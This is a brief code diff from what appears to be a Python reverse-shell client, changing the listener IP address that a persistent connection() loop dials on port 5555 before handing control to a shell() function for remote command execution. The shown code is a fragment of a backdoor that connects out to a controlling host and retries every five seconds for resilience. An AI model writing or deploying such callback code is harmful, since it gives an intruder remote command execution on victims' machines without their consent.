@@ -53,7 +53,7 @@ def connection():
         time.sleep(5)  # Wait for 5 seconds before reconnecting (for resilience)
         try:
             # Connect to a remote host with Listener IP and port 5555
-            s.connect(('192.168.56.101', 5555))
+            s.connect(('192.168.210.143', 5555))
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
